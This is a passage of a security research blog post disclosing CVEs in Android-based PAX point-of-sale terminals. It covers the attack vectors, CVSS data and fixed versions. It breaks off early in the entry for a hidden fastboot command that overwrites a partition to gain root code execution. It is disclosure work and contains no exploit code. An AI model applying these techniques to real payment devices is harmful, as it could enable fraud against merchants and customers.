<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0" >
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#02060f">
<meta name="msapplication-TileColor" content="#02060f">
<meta name="theme-color" content="#02060f">
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	
	<title>Android-based PAX POS vulnerabilities (Part 1) - STM Cyber Blog</title>
	<meta name="description" content="In this article, we present details of 6 vulnerabilities on the Android POS devices made by the worldwide known company PAX Technology." />
	<link rel="canonical" href="https://blog.stmcyber.com/pax-pos-cves-2023/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Android-based PAX POS vulnerabilities (Part 1) - STM Cyber Blog" />
	<meta property="og:description" content="In this article, we present details of 6 vulnerabilities on the Android POS devices made by the worldwide known company PAX Technology." />
	<meta property="og:url" content="https://blog.stmcyber.com/pax-pos-cves-2023/" />
	<meta property="og:site_name" content="STM Cyber Blog" />
	<meta property="article:published_time" content="2024-01-15T13:20:30+00:00" />
	<meta property="article:modified_time" content="2024-01-24T12:58:30+00:00" />
	<meta property="og:image" content="https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12-e1706038750687.png" />
	<meta property="og:image:width" content="900" />
	<meta property="og:image:height" content="750" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="Adam Kliś, Hubert Jasudowicz" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:image" content="https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12-e1706038750687.png" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#article","isPartOf":{"@id":"https://blog.stmcyber.com/pax-pos-cves-2023/"},"author":[{"@type":"Person","@id":"https://blog.stmcyber.com/#/schema/person/41e283ef2791ea95c9cfeff97fc9a8fc","name":"Adam Kliś","url":"https://blog.stmcyber.com/author/aklis/"},{"@type":"Person","@id":"https://blog.stmcyber.com/#/schema/person/ba363de618d716ff1a762dedc253956c","name":"Hubert Jasudowicz","url":"https://blog.stmcyber.com/author/hjasudowicz/"}],"headline":"Android-based PAX POS vulnerabilities (Part 1)","datePublished":"2024-01-15T13:20:30+00:00","dateModified":"2024-01-24T12:58:30+00:00","mainEntityOfPage":{"@id":"https://blog.stmcyber.com/pax-pos-cves-2023/"},"wordCount":1263,"publisher":{"@id":"https://blog.stmcyber.com/#organization"},"image":{"@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#primaryimage"},"thumbnailUrl":"https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png","keywords":["PAX Technology","Point of Sale","POS","reverse engineering","vulnerability"],"articleSection":["Research"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://blog.stmcyber.com/pax-pos-cves-2023/","url":"https://blog.stmcyber.com/pax-pos-cves-2023/","name":"Android-based PAX POS vulnerabilities (Part 1) - STM Cyber Blog","isPartOf":{"@id":"https://blog.stmcyber.com/#website"},"primaryImageOfPage":{"@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#primaryimage"},"image":{"@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#primaryimage"},"thumbnailUrl":"https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png","datePublished":"2024-01-15T13:20:30+00:00","dateModified":"2024-01-24T12:58:30+00:00","description":"In this article, we present details of 6 vulnerabilities on the Android POS devices made by the worldwide known company PAX Technology.","breadcrumb":{"@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://blog.stmcyber.com/pax-pos-cves-2023/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#primaryimage","url":"https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png","contentUrl":"https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png"},{"@type":"BreadcrumbList","@id":"https://blog.stmcyber.com/pax-pos-cves-2023/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://blog.stmcyber.com/"},{"@type":"ListItem","position":2,"name":"Android-based PAX POS vulnerabilities (Part 1)"}]},{"@type":"WebSite","@id":"https://blog.stmcyber.com/#website","url":"https://blog.stmcyber.com/","name":"STM Cyber Blog","description":"R&amp;D Team","publisher":{"@id":"https://blog.stmcyber.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://blog.stmcyber.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://blog.stmcyber.com/#organization","name":"STM Cyber R&D Dept.","url":"https://blog.stmcyber.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://blog.stmcyber.com/#/schema/logo/image/","url":"https://blog.stmcyber.com/wp-content/uploads/2021/04/stm_logo.jpg","contentUrl":"https://blog.stmcyber.com/wp-content/uploads/2021/04/stm_logo.jpg","width":200,"height":200,"caption":"STM Cyber R&D Dept."},"image":{"@id":"https://blog.stmcyber.com/#/schema/logo/image/"}},{"@type":"Person","@id":"https://blog.stmcyber.com/#/schema/person/41e283ef2791ea95c9cfeff97fc9a8fc","name":"Adam Kliś","url":"https://blog.stmcyber.com/author/aklis/"}]}</script>


<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.stmcyber.com\/wp-includes\/js\/wp-emoji-release.min.js"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://blog.stmcyber.com/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-theme-inline-css' type='text/css'>
.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote:where(.has-text-align-right){border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote:where(.has-text-align-center){border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote:where(.is-style-plain){border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='stm-vulnblocks-css' href='https://blog.stmcyber.com/wp-content/plugins/stm-vuln-blocks/block.css' type='text/css' media='all' />
<link rel='stylesheet' id='stm-normalize-css' href='https://blog.stmcyber.com/wp-content/themes/stm_research/assets/css/normalize.css' type='text/css' media='all' />
<link rel='stylesheet' id='stm-style-css' href='https://blog.stmcyber.com/wp-content/themes/stm_research/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='stm-google-fonts-css' href='https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,300;1,400;1,600;1,700;1,800&#038;family=Roboto+Mono:wght@600&#038;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,600;0,700;0,900;1,300;1,400;1,600;1,700;1,900&#038;family=Source+Code+Pro:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&#038;display=swap' type='text/css' media='all' />
<link rel='stylesheet' id='enlighterjs-css' href='https://blog.stmcyber.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css' type='text/css' media='all' />
<script type="text/javascript" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/js/shell.js" id="stm-shell-js"></script>
<script type="text/javascript" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/js/tsparticles.slim.min.js" id="stm-tsParticles-js"></script>
<link rel="https://api.w.org/" href="https://blog.stmcyber.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://blog.stmcyber.com/wp-json/wp/v2/posts/1047" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.stmcyber.com/xmlrpc.php?rsd" />

<link rel='shortlink' href='https://blog.stmcyber.com/?p=1047' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://blog.stmcyber.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.stmcyber.com%2Fpax-pos-cves-2023%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://blog.stmcyber.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.stmcyber.com%2Fpax-pos-cves-2023%2F&#038;format=xml" />
<!-- Analytics by WP Statistics v14.11.3 - https://wp-statistics.com -->
<link rel="alternate" type="application/rss+xml" title="STM Cyber Blog &raquo; Feed" href="https://blog.stmcyber.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="STM Cyber Blog &raquo; Vulnerabilities Feed" href="https://blog.stmcyber.com/feed?post_type=vulnerability" />
</head>
<body class="post-template-default single single-post postid-1047 single-format-standard wp-embed-responsive">
  <header id="top-bar">
    <div class="mid bar">
      <a class="main-page-link" href="https://www.stmcyber.pl/?lang=en" target="_blank">
        <img class="stm-logo" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/stm_logo.jpg" alt="STM logo">
      </a>
      <a class="main-page-link" href="https://blog.stmcyber.com">
        <div id="page-title">Research & Development</div>
      </a>
      <nav>
        <button class="nav-toggle" aria-label="Open menu">
          <img class="open-icon" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/menu.svg">
          <img class="close-icon" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/x.svg">
        </button>
        <ul>
          <li><a href="/vulns">Vulnerabilities</a></li>
          <li><a href="https://www.stmcyber.pl/firma?lang=en" target="_blank">Company</a></li>
          <li><a href="https://www.stmcyber.pl/uslugi?lang=en" target="_blank">Services</a></li>
          <li><a href="https://www.stm-academy.com/?lang=en" target="_blank">Academy</a></li>
        </ul>
      </nav>
    </div>
  </header>
  <div id="top-title">
    <div id="tsparticles"></div>
    <div class="mid" style="width: 100%;">
      <div id="bash-text">
                <span>$ <span class="bash-cmd"></span><span class="bash-cursor">#</span></span>
      </div>
    </div>
  </div>
  <div id="main">
        <div class="mid">
                <article class="post">
        <h1 class="title"><a href="https://blog.stmcyber.com/pax-pos-cves-2023/">Android-based PAX POS vulnerabilities (Part 1)</a></h1>
                        <div class="dt">Authors: <a href="https://blog.stmcyber.com/author/aklis/" class="author-name">Adam Kliś</a>, <a href="https://blog.stmcyber.com/author/hjasudowicz/" class="author-name">Hubert Jasudowicz</a>, 15.01.2024</div>
                <div class="content">
        
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<p>Banking companies worldwide are finally shifting away from custom-made Point of Sale (POS) devices towards the wildly adopted and battle-tested Android operating system. No more obscure terminals; the era of giant, colorful touchscreens is here! While Android is a secure, hardened OS, implementing and integrating your own features with custom hardware requires a lot of time and effort.</p>



<p>STM Cyber R&amp;D team decided to reverse engineer POS devices made by the worldwide known company PAX Technology, as they are being rapidly deployed in Poland. In this article, we present technical details of 6 vulnerabilities, which were assigned CVEs.</p>
</div></div>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png"><img decoding="async" src="https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png" alt="" class="wp-image-1134"/></a><figcaption class="wp-element-caption">Exploited PAX A920 device</figcaption></figure></div>


<p>Due to heavy application sandboxing in the Android operating system (the base for the PaxDroid system present on PAX devices), applications can't interfere with each other. Still, some applications require higher privileges to control certain parts of the device, thus they are running as higher-privileged user. However, if an attacker can escalate their privileges to the<code data-enlighter-language="generic" class="EnlighterJSRAW">root</code> account, they can tamper with any application, including certain parts of payment operations. While an attacker still can't access decrypted information about the payee (like credit card information), since they are being processed in separate Secure Processor (SP), they can modify data the merchant application sends to the SP, which includes transaction amount. Obtaining access to other high-privileged accounts, such as <code data-enlighter-language="generic" class="EnlighterJSRAW">system</code>, is also valuable since it makes the attack surface to the <code data-enlighter-language="generic" class="EnlighterJSRAW">root</code> account much bigger.</p>



<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<p>While searching for vulnerabilities, STM Cyber focused on 2 attack vectors:</p>



<ul class="wp-block-list">
<li>Local code execution from the bootloader, which doesn't require any privileges other than access to the USB port of the device. While this requires physical access to the device, this is still an interesting attack vector due to the nature of POS devices. Since different PAX POS use different CPU vendors, they also use different bootloaders. We've found <strong>CVE-2023-4818</strong> when testing PAX A920, while A920Pro and A50 were vulnerable to <strong>CVE-2023-42134</strong> and <strong>CVE-2023-42135</strong>.</li>



<li>Privilege escalation to <code data-enlighter-language="generic" class="EnlighterJSRAW">system</code> user. Vulnerabilities from this class are present in the PaxDroid system itself thus they are present in almost all Android-based PAX POS devices. <strong>CVE-2023-42136</strong> allows for privilege escalation from any user to <code data-enlighter-language="generic" class="EnlighterJSRAW">system</code> account greatly increasing attack surface. </li>
</ul>



<h2 class="wp-block-heading" id="CVE-2023-42133">CVE-2023-42133 - Reserved</h2>
</div></div>



<p>🙂</p>



<h2 class="wp-block-heading" id="CVE-2023-42134">CVE-2023-42134 - Signed partition overwrite and subsequently local code execution as root via hidden bootloader command</h2>



<ul class="wp-block-list">
<li>Product: PAX A920Pro/PAX A50/PAX A77</li>



<li>CVSS Score: CVSS 7.6 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</li>



<li>Impact: Local code execution as <code data-enlighter-language="generic" class="EnlighterJSRAW">root</code></li>



<li>Known vulnerable version: PayDroid 8.1.0_Sagittarius_11.1.50_20230314</li>



<li>Fix verified in: PayDroid 8.1.0_Sagittarius_V02.9.99T9_20230919</li>



<li>CERT.PL reference: <a href="https://cert.pl/en/posts/2024/01/CVE-2023-4818/">https://cert.pl/en/posts/2024/01/CVE-2023-4818/</a></li>
</ul>



<p>By executing the hidden <code data-enlighter-language="generic" class="EnlighterJSRAW">oem paxassert</code> command in fastboot mode, it's possible to overwrite the unsigned <code data-enlighter-language="generic" class="EnlighterJSRAW">pax1</code> partition. This results in injection of kernel arguments, resulting in arbitrary code execution. Fastboot flashing handler function first checks if we're trying to flash a special partition:</p>


